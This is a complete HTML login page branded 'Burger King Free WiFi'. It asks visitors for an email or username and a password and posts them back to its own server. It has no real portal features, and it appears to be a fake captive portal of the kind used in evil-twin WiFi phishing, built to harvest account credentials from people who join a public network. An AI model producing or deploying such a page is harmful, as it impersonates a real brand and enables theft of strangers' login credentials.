<!DOCTYPE html>
<html>
<head>
<title>Burger King Free WiFi</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
    font-family: Arial, sans-serif;
    background:#f2f2f2;
    text-align:center;
    margin-top:100px;
}

.container{
    background:white;
    width:320px;
    margin:auto;
    padding:30px;
    border-radius:12px;
    box-shadow:0 0 15px rgba(0,0,0,0.2);
}

h2{
    color:#d62300;
}

input{
    width:90%;
    padding:10px;
    margin:10px;
    border:1px solid #ccc;
    border-radius:5px;
}

button{
    padding:12px 20px;
    background:#d62300;
    color:white;
    border:none;
    border-radius:5px;
    font-size:16px;
}
</style>
</head>

<body>

<div class="container">

<h2>Burger King Free WiFi</h2>
<p>Please login to continue</p>

<form method="POST">

<input type="text" name="username" placeholder="Email or Username" required>

<input type="password" name="password" placeholder="Password" required>

<button type="submit">Connect</button>

</form>

</div>

</body>
</html>
